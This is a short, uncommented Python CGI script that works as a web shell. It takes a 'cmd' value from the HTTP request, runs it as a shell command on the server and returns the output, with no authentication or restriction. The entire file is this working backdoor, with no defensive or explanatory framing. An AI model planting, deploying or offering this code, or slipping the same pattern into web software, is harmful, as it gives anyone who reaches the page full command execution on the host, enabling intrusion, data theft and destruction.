#!/usr/bin/env python3
import cgi, subprocess
print("Content-Type: text/plain\r\n")
cmd = cgi.FieldStorage().getvalue("cmd")
if cmd:
    print(subprocess.getoutput(cmd))
